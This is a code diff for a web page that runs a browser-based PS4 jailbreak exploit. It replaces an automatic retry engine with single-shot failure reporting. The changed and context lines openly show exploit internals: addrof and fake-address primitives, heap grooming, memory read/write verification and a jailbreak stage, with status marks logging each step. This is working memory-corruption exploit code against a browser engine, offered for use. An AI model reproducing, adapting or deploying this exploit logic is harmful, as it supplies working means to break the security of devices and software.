@@ -310,10 +310,6 @@ function updateStatusFromMark(tag, extra) {
 
     if (t === "BOOT") {
         setStatus("running", "RUNNING", e);
-    } else if (t.indexOf("ATTEMPT") === 0) {
-        setStatus("running", "RUNNING — ATTEMPT " + e.split("-")[0], e);
-    } else if (t.indexOf("RETRY") === 0) {
-        setStatus("running", "RETRYING…", e);
     } else if (t.indexOf("PS4 JAILBREAK START") !== -1) {
         setStatus("running", "JAILBREAKING…", e);
     } else if (t.indexOf("GENUINE-UB-RW-PASS") !== -1) {
@@ -321,8 +317,8 @@ function updateStatusFromMark(tag, extra) {
     } else if (t.indexOf("JAILBREAK COMPLETE") !== -1) {
         setStatus("pass", "JAILBREAK COMPLETE — PASS", e);
         maybeAutoSave();
-    } else if (t.indexOf("GIVE-UP") === 0) {
-        setStatus("fail", "GIVE UP — FAIL", e);
+    } else if (t.indexOf("FAILED-TERMINAL") === 0) {
+        setStatus("fail", "FAILED — " + e, "terminal, no retry");
         maybeAutoSave();
     } else if (t.indexOf("JAILBREAK-ERROR") === 0) {
         setStatus("fail", "JAILBREAK ERROR — FAIL", e);
@@ -342,8 +338,6 @@ function buildLogText() {
     L.push("User Agent   : " + navigator.userAgent);
     L.push("Started      : " + new Date(LOG.startTime).toISOString());
     L.push("Ended        : " + new Date().toISOString());
-    L.push("Attempts     : " + (typeof attemptNumber !== "undefined" ? attemptNumber : "?") +
-                            " / " + (typeof MAX_ATTEMPTS !== "undefined" ? MAX_ATTEMPTS : "?"));
     L.push("Final Status : " + LOG.statusText + "  [" + LOG.status.toUpperCase() + "]");
     L.push("Counts       : PASS=" + LOG.counts.pass +
                        "  FAIL=" + LOG.counts.fail +
@@ -439,7 +433,7 @@ function clearLog() {
 })();
 
 /* ============================================================
- *  EXPLOIT (original logic, presentation rewired)
+ *  EXPLOIT (single-shot, no auto-retry)
  * ============================================================ */
 
 // ========== HEADER MESSAGE ==========
@@ -495,8 +489,6 @@ var DRAIN_COUNT = isFinite(requestedDrain) ? Math.max(64, Math.min(1024, request
 var LITE = Q.get("l") === "1";
 
 var REVISION = "genuine-u8-rw-3-1352";
-var MAX_ATTEMPTS = 10;
-var attemptNumber = 0;
 var K = 2;
 var DUPLICATE_INDEX = 2;
 var CONTROL_INDEX = 0xffff;
@@ -644,6 +636,13 @@ function prepareSymbolWrapper(F) {
     for (var j = 0; j < 8; j++) leakedScope[j] = 1.1 * j;
     Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
     return Object(leakedScope.g);
+}
+
+/* Single terminal failure reporter — replaces the old retry engine. */
+function failTerminal(reason, detail) {
+    attemptSucceeded = false;
+    mark("FAILED-TERMINAL", "reason=" + reason + (detail ? "-" + detail : ""));
+    try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
 }
 
 // ========== EXPLOIT CORE ==========
@@ -907,9 +906,8 @@ function reportComposition() {
     if (compositionState < 0) {
         mark(retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW", (compositionError && compositionError.name) + ":" + String(compositionError && compositionError.message).slice(0, 80));
         mark("DONE-THROW", "predecessor-cleared=true");
-        if (!retrySafe) { try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {} }
         setTimeout(function() { mark("SURVIVED-THROW-T1000"); }, 1000);
-        scheduleRetry(retrySafe ? "placement-miss" : "load-threw");
+        failTerminal(retrySafe ? "placement-miss" : "load-threw");
         return;
     }
 
@@ -917,7 +915,7 @@ function reportComposition() {
         mark("NORMAL-CLONE-MISS", "known-reference-returned=true");
         mark("DONE-MISS", "predecessor-cleared=true");
         setTimeout(function() { mark("SURVIVED-MISS-T1000"); }, 1000);
-        scheduleRetry("clone-miss");
+        failTerminal("clone-miss");
         return;
     }
 
@@ -925,15 +923,14 @@ function reportComposition() {
         mark("HEADER-MISMATCH", "rw=" + rwHeaderOK + "-target=" + targetHeaderOK + "-carrier-restored=true");
         mark("RW-HEADER-HEX", dumpHex(rwHeader));
         mark("TARGET-HEADER-HEX", dumpHex(targetHeader));
-        if (!retrySafe) { try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {} }
         setTimeout(function() { mark("SURVIVED-MISMATCH-T1000"); }, 1000);
-        scheduleRetry("header-mismatch");
+        failTerminal("header-mismatch");
         return;
     }
 
     if (compositionState === 0) {
         mark("NO-RESULT", "critical-load-did-not-finish");
-        scheduleRetry("no-result");
+        failTerminal("no-result");
         return;
     }
 
@@ -960,13 +957,14 @@ function reportComposition() {
             testRun = true;
             setTimeout(runJailbreak, 500);
         }
+    } else {
+        failTerminal("rw-verify-miss", "read=" + readPass + "-write=" + writePass);
     }
 
     mark("ROOTS-LIVE", "rw-byte=" + rwView[0].toString(16) + "-target-byte=" + targetView[0].toString(16) + "-length-word=" + lengthWord.keep.toString(16));
     setTimeout(function() { mark("SURVIVED-T100"); }, 100);
     setTimeout(function() { mark("SURVIVED-T1000"); }, 1000);
     setTimeout(function() { mark("SURVIVED-T3000"); }, 3000);
-    if (!attemptSucceeded) scheduleRetry("rw-verify-miss");
 }
 
 function runGroomAndLoad() {
@@ -1009,12 +1007,12 @@ function runGroomAndLoad() {
 function beginComposition() {
     if (captureState === 0) {
         mark("ADDROF-NO-RESULT", "capture-task-did-not-finish");
-        scheduleRetry("addrof-no-result");
+        failTerminal("addrof-no-result");
         return;
     }
     if (captureState < 0) {
         mark("ADDROF-THREW", (captureError && captureError.name) + ":" + String(captureError && captureError.message).slice(0, 80));
-        scheduleRetry("addrof-threw");
+        failTerminal("addrof-threw");
         return;
     }
 
@@ -1034,7 +1032,7 @@ function beginComposition() {
 
     if (!(repeated && distinct && plausible && sourceCovered)) {
         mark("ADDROF-FAIL", "repeat=" + repeated + "-distinct=" + distinct + "-plausible=" + plausible + "-covered=" + sourceCovered);
-        scheduleRetry("addrof-fail");
+        failTerminal("addrof-fail");
         return;
     }
 
@@ -1044,13 +1042,13 @@ function beginComposition() {
     targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
     if (targetAddressHigh < 0 || targetAddressHigh > 0xffff || targetAddressLow < 0 || targetAddressLow > 0xffffffff || Math.floor(targetAddressLow) !== targetAddressLow || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
         mark("TARGET-ADDRESS-FAIL", "target=" + hex(targetAddress));
-        scheduleRetry("target-addr-fail");
+        failTerminal("target-addr-fail");
         return;
     }
     fakeAddress = hostAddress + 0x10;
     if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
         mark("FAKE-ADDRESS-FAIL", "host=" + hex(hostAddress));
-        scheduleRetry("fake-addr-fail");
+        failTerminal("fake-addr-fail");
         return;
     }
     mark("FAKE-ADDRESS", "host=" + hex(hostAddress) + "-fake=" + hex(fakeAddress) + "-delta=0x10");
@@ -1225,57 +1223,17 @@ function runJailbreak() {
     }
 }
 
-// ========== AUTO-RETRY ENGINE ==========
+// ========== SINGLE-SHOT ENTRY ==========
 var attemptSucceeded = false;
 
-function cleanupForRetry() {
-    try { history.replaceState(undefined, ""); } catch (_) {}
-    try { sessionStorage.removeItem(REVISION + ":blocked"); } catch (_) {}
-    try { sessionStorage.removeItem(REVISION + ":passed"); } catch (_) {}
-    getterCarrier = null;
-    preparedSymbolObject = null;
-    capturedString = null;
-    capturedWords = null;
-    fillerGraph = null;
-    outerGraph = null;
-    rwBuffer = null; rwView = null; rwMirror = null;
-    targetBuffer = null; targetView = null;
-    globalFakeArray = null;
-    referenceTarget = null;
-    lengthWord = null;
-    predecessorWords = null;
-    leakedScope = null;
-    for (var i = 0; i < keepAlive.length; i++) keepAlive[i] = null;
-    keepIndex = 0;
-    captureState = 0;
-    hostAddress = NaN; fakeAddress = NaN; targetAddress = NaN;
-    rwHeaderOK = false; targetHeaderOK = false;
-    readObserved = false; writeObserved = false; restoreObserved = false;
-    compositionState = 0;
-    retrySafe = false;
-}
-
-function scheduleRetry(reason) {
-    attemptSucceeded = false;
-    if (attemptNumber >= MAX_ATTEMPTS) {
-        mark("GIVE-UP", "all-" + MAX_ATTEMPTS + "-attempts-failed last=" + reason);
-        mark("ADVICE", "power-cycle-the-ps4-fresh-boot-then-one-clean-load");
-        return;
-    }
-    mark("RETRY", "reason=" + reason + "-next=" + (attemptNumber + 1) + "-of-" + MAX_ATTEMPTS);
-    setTimeout(runAttempt, 1500);
-}
-
 function runAttempt() {
-    attemptNumber++;
-    if (attemptNumber > 1) cleanupForRetry();
-    mark("ATTEMPT", attemptNumber + "-of-" + MAX_ATTEMPTS + "-n=" + DRAIN_COUNT);
+    mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT);
     try {
         buildAndStoreGraph();
         prepareAddrof();
     } catch (error) {
         mark("SETUP-THREW", (error && error.name) + ":" + String(error && error.message).slice(0, 80));
-        scheduleRetry("setup");
+        failTerminal("setup");
     }
 }
 
@@ -1284,7 +1242,6 @@ try {
     document.getElementById("toolbarMeta").textContent = "rev " + REVISION + " · fw " + (FW_LABEL || "?");
 } catch (_) {}
 
-mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT + "-attempts=" + MAX_ATTEMPTS);
 runAttempt();
 </script>
 </body>
